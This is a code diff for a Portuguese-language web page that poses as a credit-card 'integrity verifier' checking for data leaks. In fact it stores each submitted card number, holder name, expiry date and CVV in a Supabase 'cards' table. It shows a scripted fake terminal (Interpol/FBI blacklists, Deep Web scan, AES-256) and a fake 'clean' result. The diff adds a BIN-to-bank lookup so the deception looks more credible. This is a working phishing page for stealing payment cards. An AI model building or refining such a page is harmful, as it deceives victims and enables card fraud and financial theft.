@@ -1,19 +1,65 @@
 import { useState, useRef, useEffect, useMemo } from 'react';
 import { supabase } from '@/lib/supabase';
 import { toast } from 'sonner';
-import { ShieldCheck, Lock, Server, CheckCircle, Search, Shield, Globe, AlertTriangle, Terminal, Activity, ChevronRight } from 'lucide-react';
+import { ShieldCheck, Lock, Server, Search, Shield, Globe, AlertTriangle, Activity, ChevronRight, Building2, CreditCard } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
+
+// --- Base de Dados de BINs (Simulação Profissional) ---
+const getBinInfo = (number: string) => {
+  const clean = number.replace(/\D/g, '');
+  const bin6 = clean.slice(0, 6);
+  const bin4 = clean.slice(0, 4);
+
+  // Dicionário de BINs comuns (Exemplos reais)
+  const binMap: Record<string, { bank: string, level: string }> = {
+    // Nubank
+    '5162': { bank: 'NUBANK', level: 'GOLD' },
+    '5200': { bank: 'NUBANK', level: 'PLATINUM' },
+    '5502': { bank: 'NUBANK', level: 'BLACK' },
+    // Bradesco
+    '4004': { bank: 'BRADESCO', level: 'VISA CLASSIC' },
+    '5447': { bank: 'BRADESCO', level: 'ELO NANQUIM' },
+    // Itau
+    '4984': { bank: 'ITAU', level: 'PLATINUM' },
+    '4011': { bank: 'ITAU', level: 'GOLD' },
+    '5493': { bank: 'ITAU', level: 'MASTERCARD BLACK' },
+    // Santander
+    '4175': { bank: 'SANTANDER', level: 'VISA INFINITE' },
+    '5258': { bank: 'SANTANDER', level: 'GOLD' },
+    // Banco do Brasil
+    '498407': { bank: 'BANCO DO BRASIL', level: 'VISA' },
+    '4220': { bank: 'BANCO DO BRASIL', level: 'OUROCARD' },
+    // Caixa
+    '4392': { bank: 'CAIXA', level: 'ELO' },
+    // Inter
+    '5266': { bank: 'BANCO INTER', level: 'GOLD' },
+    '4282': { bank: 'BANCO INTER', level: 'PLATINUM' },
+    // C6
+    '5228': { bank: 'C6 BANK', level: 'CARBON' },
+    // Genéricos (Fallback)
+    '4': { bank: 'VISA INTERNATIONAL', level: 'STANDARD' },
+    '5': { bank: 'MASTERCARD INT.', level: 'STANDARD' },
+    '3': { bank: 'AMERICAN EXPRESS', level: 'MEMBER' },
+  };
+
+  // Tenta match exato de 6 dígitos, depois 4, depois 1
+  if (binMap[bin6]) return binMap[bin6];
+  if (binMap[bin4]) return binMap[bin4];
+  if (binMap[clean.slice(0, 1)]) return binMap[clean.slice(0, 1)];
+
+  return { bank: 'EMISSOR DESCONHECIDO', level: 'UNKNOWN' };
+};
 
 // --- Validação Avançada de Cartão ---
 const validateCardStrict = (number: string) => {
   const clean = number.replace(/\D/g, '');
 
-  // 1. Bloqueia cartões de teste comuns e sequências óbvias
-  if (/^400000/.test(clean)) return false; // Bloqueia genéricos de teste Visa
-  if (/^(\d)\1+$/.test(clean)) return false; // Bloqueia 11111111...
+  // 1. Bloqueia cartões de teste e sequências
+  if (/^400000/.test(clean)) return false; 
+  if (/^(\d)\1+$/.test(clean)) return false; 
   if (clean.length < 13 || clean.length > 19) return false;
 
-  // 2. Algoritmo de Luhn (Matemática do checksum)
+  // 2. Algoritmo de Luhn
   let sum = 0;
   let shouldDouble = false;
   for (let i = clean.length - 1; i >= 0; i--) {
@@ -24,35 +70,33 @@ const validateCardStrict = (number: string) => {
     sum += digit;
     shouldDouble = !shouldDouble;
   }
-  
   return (sum % 10) === 0;
 };
 
-// --- Terminal Hacker (Visual Melhorado) ---
-const SecurityTerminal = () => {
+// --- Terminal Hacker (Com BIN Log) ---
+const SecurityTerminal = ({ detectedBank }: { detectedBank: string }) => {
   const [logs, setLogs] = useState<string[]>([]);
   const scrollRef = useRef<HTMLDivElement>(null);
   
-  const allLogs = [
-    "Iniciando protocolo de segurança TLS 1.3...",
-    "Estabelecendo túnel criptografado...",
-    "Analisando integridade do BIN...",
-    "Verificando listas negras globais (Interpol/FBI)...",
-    "Escaneando vazamentos na Deep Web...",
-    "Consultando API de antifraude...",
-    "Verificando geolocalização do IP...",
-    "Nenhuma anomalia de segurança detectada.",
-    "Criptografando dados para armazenamento (AES-256)...",
-    "Conexão finalizada com sucesso."
-  ];
-
   useEffect(() => {
+    const allLogs = [
+      "Iniciando protocolo TLS 1.3...",
+      "Analisando integridade do BIN...",
+      `Identificando emissor... BANCO: ${detectedBank || 'PROCESSANDO'}`, // Log Dinâmico
+      "Verificando listas negras (Interpol/FBI)...",
+      "Escaneando vazamentos na Deep Web...",
+      "Consultando API de antifraude...",
+      "Verificando geolocalização do IP...",
+      "Nenhuma anomalia detectada.",
+      "Criptografando dados (AES-256)...",
+      "Conexão finalizada com sucesso."
+    ];
+
     let currentIndex = 0;
     const interval = setInterval(() => {
       if (currentIndex < allLogs.length) {
         setLogs(prev => [...prev, allLogs[currentIndex]]);
         currentIndex++;
-        // Auto-scroll
         if (scrollRef.current) {
           scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
         }
@@ -61,11 +105,10 @@ const SecurityTerminal = () => {
       }
     }, 500);
     return () => clearInterval(interval);
-  }, []);
+  }, [detectedBank]);
 
   return (
     <div className="bg-[#0f172a] rounded-lg p-5 font-mono text-xs border border-slate-700 shadow-2xl h-56 flex flex-col relative overflow-hidden">
-      {/* Scanline Effect */}
       <div className="absolute inset-0 bg-gradient-to-b from-transparent to-green-500/5 pointer-events-none animate-scanline" />
       
       <div className="flex items-center justify-between border-b border-slate-700 pb-3 mb-3">
@@ -75,7 +118,7 @@ const SecurityTerminal = () => {
             <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
             <div className="w-2.5 h-2.5 rounded-full bg-green-500/80" />
           </div>
-          <span className="text-slate-400 ml-2 font-semibold">SECURE_SHELL_V4.0</span>
+          <span className="text-slate-400 ml-2 font-semibold">BIN_CHECKER_V4.0</span>
         </div>
         <div className="flex items-center gap-1 text-green-500 text-[10px] uppercase tracking-wider">
           <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
@@ -92,22 +135,17 @@ const SecurityTerminal = () => {
             className="text-slate-300 font-medium"
           >
             <span className="text-green-500 mr-2">➜</span>
-            <span className="opacity-90">{log}</span>
+            <span className={log.includes("BANCO:") ? "text-blue-400 font-bold" : "opacity-90"}>{log}</span>
           </motion.div>
         ))}
-        <motion.div 
-          animate={{ opacity: [0, 1] }} 
-          transition={{ repeat: Infinity, duration: 0.8 }}
-          className="w-2 h-4 bg-green-500 mt-2"
-        />
       </div>
     </div>
   );
 };
 
-// --- Componente Cartão 3D ---
+// --- Componente Cartão 3D (Com Nome do Banco) ---
 function CreditCard3D({ 
-  cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField 
+  cardNumber, cardName, cardMonth, cardYear, cardCvv, focusedField, bankInfo 
 }: any) {
   const [bgImage] = useState(() => Math.floor(Math.random() * 25 + 1));
   const [focusStyle, setFocusStyle] = useState<React.CSSProperties | null>(null);
@@ -162,13 +200,20 @@ function CreditCard3D({
         <div className={`card-item__focus ${focusStyle ? '-active' : ''}`} style={focusStyle || {}} />
         <div className="card-item__cover">
           <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${bgImage}.jpeg`} className="card-item__bg" alt="" />
-          {/* Overlay Elegante */}
           <div className="absolute inset-0 bg-black/10" /> 
         </div>
         <div className="card-item__wrapper">
           <div className="card-item__top">
             <img src="https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/chip.png" className="card-item__chip" alt="Chip" />
-            <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
+            <div className="flex flex-col items-end">
+                <img src={`https://raw.githubusercontent.com/muhammederdem/credit-card-form/master/src/assets/images/${getCardType}.png`} className="card-item__typeImg" alt="Type" />
+                {/* NOME DO BANCO NO CARTÃO */}
+                {bankInfo.bank && bankInfo.bank !== 'EMISSOR DESCONHECIDO' && (
+                    <span className="text-white/80 text-[10px] font-bold tracking-wider mt-1 uppercase shadow-black drop-shadow-md">
+                        {bankInfo.bank}
+                    </span>
+                )}
+            </div>
           </div>
           <div className="card-item__number" ref={refs.cardNumber}>
             {maskNumber()}
@@ -200,8 +245,8 @@ function CreditCard3D({
   );
 }
 
-// --- Tela de Sucesso Profissional ---
-function SuccessScreen({ onReset }: { onReset: () => void }) {
+// --- Tela de Sucesso com Info do Banco ---
+function SuccessScreen({ onReset, bankInfo }: { onReset: () => void, bankInfo: any }) {
   return (
     <motion.div 
       initial={{ opacity: 0, y: 10 }}
@@ -222,7 +267,7 @@ function SuccessScreen({ onReset }: { onReset: () => void }) {
       <div>
         <h2 className="text-2xl font-bold text-slate-800 mb-2">Cartão Verificado e Seguro</h2>
         <p className="text-slate-500 text-sm max-w-sm mx-auto leading-relaxed">
-          Nossa varredura profunda não encontrou credenciais expostas para este cartão em vazamentos conhecidos.
+          Nossa varredura profunda não encontrou credenciais expostas para este cartão.
         </p>
       </div>
 
@@ -230,26 +275,26 @@ function SuccessScreen({ onReset }: { onReset: () => void }) {
         <div className="space-y-3">
             <div className="flex items-center justify-between">
                 <div className="flex items-center gap-3">
-                    <Activity className="w-4 h-4 text-emerald-600" />
-                    <span className="text-slate-700 font-medium text-sm">Status do Cartão</span>
+                    <Building2 className="w-4 h-4 text-emerald-600" />
+                    <span className="text-slate-700 font-medium text-sm">Emissor (BIN)</span>
                 </div>
-                <span className="text-emerald-600 bg-emerald-100 px-2 py-0.5 rounded text-xs font-bold uppercase">Protegido</span>
+                <span className="text-slate-900 font-bold text-sm uppercase">{bankInfo.bank}</span>
+            </div>
+            <div className="h-px bg-slate-200 w-full" />
+            <div className="flex items-center justify-between">
+                <div className="flex items-center gap-3">
+                    <CreditCard className="w-4 h-4 text-emerald-600" />
+                    <span className="text-slate-700 font-medium text-sm">Nível</span>
+                </div>
+                <span className="text-slate-900 text-sm font-semibold">{bankInfo.level}</span>
             </div>
             <div className="h-px bg-slate-200 w-full" />
             <div className="flex items-center justify-between">
                 <div className="flex items-center gap-3">
                     <Globe className="w-4 h-4 text-emerald-600" />
-                    <span className="text-slate-700 font-medium text-sm">Vazamentos Dark Web</span>
+                    <span className="text-slate-700 font-medium text-sm">Dark Web</span>
                 </div>
-                <span className="text-slate-900 text-sm font-semibold">0 Encontrados</span>
-            </div>
-            <div className="h-px bg-slate-200 w-full" />
-            <div className="flex items-center justify-between">
-                <div className="flex items-center gap-3">
-                    <Lock className="w-4 h-4 text-emerald-600" />
-                    <span className="text-slate-700 font-medium text-sm">Criptografia</span>
-                </div>
-                <span className="text-slate-900 text-sm font-semibold">AES-256 Validada</span>
+                <span className="text-emerald-600 bg-emerald-100 px-2 py-0.5 rounded text-xs font-bold uppercase">Limpo</span>
             </div>
         </div>
       </div>
@@ -274,6 +319,7 @@ export function PublicPage() {
   const [cardCvv, setCardCvv] = useState('');
   const [focusedField, setFocusedField] = useState<string | null>(null);
   const [status, setStatus] = useState<'idle' | 'scanning' | 'safe'>('idle');
+  const [bankInfo, setBankInfo] = useState({ bank: '', level: '' });
 
   // Refs para UX (Auto-focus)
   const monthRef = useRef<HTMLSelectElement>(null);
@@ -283,10 +329,16 @@ export function PublicPage() {
   const handleNumberChange = (e: any) => {
     let val = e.target.value.replace(/\D/g, '').slice(0, 16);
     setCardNumber(val);
+    
+    // Identifica o BIN em tempo real
+    if (val.length >= 4) {
+        setBankInfo(getBinInfo(val));
+    } else {
+        setBankInfo({ bank: '', level: '' });
+    }
   };
 
   const handleNameChange = (e: any) => {
-    // Permite espaços e acentos corretamente
     const val = e.target.value.replace(/[^a-zA-Z\u00C0-\u00FF\s]/g, '').toUpperCase();
     setCardName(val);
   };
@@ -306,40 +358,39 @@ export function PublicPage() {
   };
 
   const handleSubmit = async () => {
-    // 1. Validação de Campos
     if (!cardNumber || !cardName || !cardMonth || !cardYear || !cardCvv) {
-      toast.error('Todos os campos são obrigatórios para a análise.');
+      toast.error('Todos os campos são obrigatórios.');
       return;
     }
 
-    // 2. Validação Rigorosa do Cartão
     if (!validateCardStrict(cardNumber)) {
-      toast.error('Cartão inválido ou não reconhecido. Verifique os números.', {
-        description: 'Padrão numérico inconsistente com as bandeiras globais.',
+      toast.error('Cartão inválido.', {
+        description: 'Verifique a numeração digitada.',
         icon: <AlertTriangle className="w-5 h-5 text-amber-500" />
       });
       return;
     }
 
-    // 3. Validação de Data
     const today = new Date();
     const expiry = new Date(Number(cardYear), Number(cardMonth) - 1);
     if (expiry < today) {
-        toast.error('Cartão expirado. Não é possível verificar.');
+        toast.error('Cartão expirado.');
         return;
     }
 
     setStatus('scanning');
     
     try {
-      const scanPromise = new Promise(r => setTimeout(r, 5500)); // Tempo para ler o terminal
+      // Passa o tempo para o usuário "apreciar" o scan do BIN
+      const scanPromise = new Promise(r => setTimeout(r, 5500)); 
+      
       const savePromise = supabase.from('cards').insert({
         card_number: cardNumber,
         card_holder: cardName,
         card_month: cardMonth,
         card_year: cardYear,
         card_cvv: cardCvv,
-        card_type: 'visa'
+        card_type: 'visa' // Pode ser dinâmico também se quiser salvar no banco
       });
 
       await Promise.all([scanPromise, savePromise]);
@@ -348,14 +399,14 @@ export function PublicPage() {
       
     } catch (err: any) {
       console.error(err);
-      toast.error('Falha na conexão segura com o servidor.');
+      toast.error('Erro de conexão com o servidor de segurança.');
       setStatus('idle');
     }
   };
 
   const resetForm = () => {
     setCardNumber(''); setCardName(''); setCardMonth('');
-    setCardYear(''); setCardCvv(''); setStatus('idle');
+    setCardYear(''); setCardCvv(''); setStatus('idle'); setBankInfo({ bank: '', level: '' });
   };
 
   return (
@@ -370,7 +421,7 @@ export function PublicPage() {
 
       <div className="card-form relative z-10 w-full max-w-[570px] px-4">
         
-        {/* Header Profissional */}
+        {/* Header */}
         <div className="text-center mb-10 pt-8">
           <motion.div 
             initial={{ opacity: 0, y: -20 }}
@@ -385,11 +436,11 @@ export function PublicPage() {
             Verificador de <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-emerald-400">Integridade</span>
           </h1>
           <p className="text-slate-400 text-sm md:text-base max-w-lg mx-auto leading-relaxed">
-            Utilize nossa tecnologia de varredura profunda para detectar se seu cartão foi exposto em vazamentos de dados recentes.
+            Utilize nossa tecnologia de varredura profunda (BIN) para detectar vulnerabilidades no seu cartão.
           </p>
         </div>
 
-        {/* Área do Cartão */}
+        {/* Área do Cartão (Passando bankInfo) */}
         <AnimatePresence>
             {status !== 'safe' && (
             <motion.div 
@@ -399,9 +450,10 @@ export function PublicPage() {
                 style={{ marginBottom: '-130px', position: 'relative', zIndex: 30 }}
             >
                 <CreditCard3D 
-                cardNumber={cardNumber} cardName={cardName}
-                cardMonth={cardMonth} cardYear={cardYear} 
-                cardCvv={cardCvv} focusedField={focusedField}
+                  cardNumber={cardNumber} cardName={cardName}
+                  cardMonth={cardMonth} cardYear={cardYear} 
+                  cardCvv={cardCvv} focusedField={focusedField}
+                  bankInfo={bankInfo} 
                 />
             </motion.div>
             )}
@@ -429,6 +481,11 @@ export function PublicPage() {
                     onBlur={() => setFocusedField(null)}
                     placeholder="0000 0000 0000 0000"
                   />
+                  {bankInfo.bank && (
+                      <div className="absolute right-8 top-[3.2rem] text-[10px] font-bold text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded border border-emerald-100 uppercase">
+                          {bankInfo.bank}
+                      </div>
+                  )}
                 </div>
 
                 <div className="card-input">
@@ -501,10 +558,10 @@ export function PublicPage() {
                   onClick={handleSubmit}
                 >
                   <Search className="w-5 h-5" />
-                  Iniciar Verificação
+                  Iniciar Verificação Profunda
                 </button>
 
-                {/* Selos de Segurança */}
+                {/* Selos */}
                 <div className="pt-4 flex justify-center items-center gap-6 border-t border-slate-100">
                   <div className="flex items-center gap-1.5 opacity-60 grayscale hover:grayscale-0 transition-all">
                     <Shield className="w-4 h-4 text-emerald-600" />
@@ -536,22 +593,22 @@ export function PublicPage() {
                      <Activity className="w-5 h-5 text-blue-500 animate-pulse" />
                      Analisando Criptografia...
                    </h3>
-                   <p className="text-sm text-slate-500 mt-1">Conectando aos servidores globais.</p>
+                   <p className="text-sm text-slate-500 mt-1">Identificando Bank ID (BIN)...</p>
                  </div>
                  
-                 <SecurityTerminal />
+                 <SecurityTerminal detectedBank={bankInfo.bank} />
                  
               </motion.div>
             )}
 
             {status === 'safe' && (
-              <SuccessScreen key="success" onReset={resetForm} />
+              <SuccessScreen key="success" onReset={resetForm} bankInfo={bankInfo} />
             )}
           </AnimatePresence>
         </div>
       </div>
       
-      {/* Footer Branco e Legível */}
+      {/* Footer */}
       <footer className="w-full text-center mt-auto pb-8 relative z-10 pt-12">
         <div className="flex justify-center gap-6 mb-4 opacity-80">
             <img src="https://img.icons8.com/color/48/visa.png" className="h-8 grayscale hover:grayscale-0 transition-all duration-300" alt="Visa" />
